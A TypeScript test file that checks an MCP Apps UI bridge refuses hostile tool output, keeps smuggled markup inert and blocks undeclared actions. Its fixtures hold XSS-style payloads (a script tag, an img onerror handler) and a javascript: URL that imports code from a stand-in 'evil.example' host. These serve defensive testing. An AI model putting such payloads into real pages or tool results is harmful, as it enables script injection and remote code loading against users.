// @spec:030-adapter-mcp-apps
// User Story 2 (P1): malicious tool output cannot escape the guardrail. Hostile
// spec content is refused, smuggled markup stays inert, only declared actions
// leave the surface, and a message without the protocol envelope never becomes
// state — all deterministic, no model in the loop. Every inbound message has
// the exact MCP Apps 2026-01-26 shape (fixtures cited in ./spec-messages.ts).
import { beforeEach, describe, expect, it } from 'vitest';

import type { BridgeRefusal, SurfaceOutboundMessage } from '../src/index.js';
import { createSurfaceBridge } from '../src/index.js';
import { expectedActionCall, initializeResult, toolResult } from './spec-messages.js';

let surface: HTMLElement;

beforeEach(() => {
  document.body.replaceChildren();
  surface = document.createElement('div');
  document.body.appendChild(surface);
});

interface Harness {
  bridge: ReturnType<typeof createSurfaceBridge>;
  sent: SurfaceOutboundMessage[];
  refusals: BridgeRefusal[];
}

/** A bridge whose handshake a conforming host has completed. */
const harness = (): Harness => {
  const sent: SurfaceOutboundMessage[] = [];
  const refusals: BridgeRefusal[] = [];
  const bridge = createSurfaceBridge({
    onRefusal: (refusal) => refusals.push(refusal),
    send: (message) => sent.push(message),
    surface,
  });
  bridge.start();
  bridge.receive(initializeResult(1));
  sent.length = 0; // keep only what the scenario itself causes
  return { bridge, refusals, sent };
};

describe('the guarded renderer is the only render path', () => {
  it.each([
    {
      component: 'iframe',
      props: { src: 'https://evil.example' },
      rule: 'unknown-component',
      value: 'iframe',
    },
    {
      component: 'ki-button',
      props: { onclick: 'steal()' },
      rule: 'unknown-prop',
      slots: { '': ['Go'] },
      value: 'onclick',
    },
  ])('S4 refuses hostile spec content and renders only catalog components', (example) => {
    const { bridge, refusals } = harness();
    const spec = {
      root: {
        component: example.component,
        props: example.props,
        ...('slots' in example ? { slots: example.slots } : {}),
      },
      version: 1,
    };

    const result = bridge.receive(toolResult(spec));

    expect(result.ok).toBe(false);
    expect(
      result.refusals.some((r) => r.reason === example.rule && r.value === example.value),
    ).toBe(true);
    expect(refusals.length).toBeGreaterThan(0);
    // Nothing outside the catalog rendered (atomic fail-closed).
    expect(surface.querySelector('iframe')).toBeNull();
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S5 keeps markup smuggled in result data inert', () => {
    const { bridge } = harness();
    const titleBefore = document.title;
    const spec = {
      root: {
        component: 'ki-card',
        slots: { '': ["<script>document.title='owned'</script>"] },
      },
      version: 1,
    };

    const result = bridge.receive(toolResult(spec, "<script>document.title='owned'</script>"));

    expect(result.ok).toBe(true);
    // The field appears as inert text; no script node, title unchanged.
    expect(surface.querySelector('script')).toBeNull();
    expect(document.title).toBe(titleBefore);
    expect(surface.querySelector('ki-card')?.textContent).toContain('<script>');
  });

  it('S5 never renders the text content of a tool result', () => {
    const { bridge } = harness();

    // `content` is the model/text fallback (apps.mdx:1473), never a render path.
    bridge.receive({
      jsonrpc: '2.0',
      method: 'ui/notifications/tool-result',
      params: {
        content: [{ text: '<img src=x onerror=alert(1)>', type: 'text' }],
      },
    });

    expect(surface.childNodes).toHaveLength(0);
  });

  it('S6 lets only declared actions leave the surface, as tools/call to the action tool', () => {
    const { bridge, refusals, sent } = harness();
    bridge.receive(
      toolResult({
        actions: ['refresh-inventory'],
        root: {
          action: 'refresh-inventory',
          component: 'ki-button',
          slots: { '': ['Refresh'] },
        },
        version: 1,
      }),
    );

    const undeclared = bridge.dispatch('transfer-funds');
    expect(undeclared.sent).toBe(false);
    expect(sent).toHaveLength(0);
    expect(
      refusals.some((r) => r.reason === 'undeclared-action' && r.value === 'transfer-funds'),
    ).toBe(true);

    const declared = bridge.dispatch('refresh-inventory');
    expect(declared.sent).toBe(true);
    expect(sent).toEqual([expectedActionCall(2, 'refresh-inventory')]);
  });

  it('S6 dispatches a declared action when the user activates its control', () => {
    const { bridge, sent } = harness();
    bridge.receive(
      toolResult({
        actions: ['refresh-inventory'],
        root: {
          action: 'refresh-inventory',
          component: 'ki-button',
          slots: { '': ['Refresh'] },
        },
        version: 1,
      }),
    );

    surface.querySelector('ki-button')?.dispatchEvent(new Event('click', { bubbles: true }));

    expect(sent).toEqual([expectedActionCall(2, 'refresh-inventory')]);
  });

  it('S7 ignores a message without the protocol envelope, leaving state unchanged', () => {
    const { bridge, sent } = harness();
    bridge.receive(
      toolResult({
        root: { component: 'ki-card', slots: { '': ['hello'] } },
        version: 1,
      }),
    );
    const rendered = surface.innerHTML;
    expect(surface.querySelector('ki-card')).not.toBeNull();

    for (const raw of [
      "javascript:import('https://evil.example/x.js')",
      null,
      [toolResult({ root: { component: 'ki-badge' }, version: 1 })], // a JSON-RPC batch
      { method: 'ui/notifications/tool-result', params: {} }, // no jsonrpc: "2.0"
      { jsonrpc: '2.0', method: 'ui/notifications/tool-result', params: 'x' },
    ]) {
      expect(bridge.receive(raw).handled).toBe(false);
    }

    expect(surface.innerHTML).toBe(rendered);
    expect(sent).toHaveLength(0);
  });
});
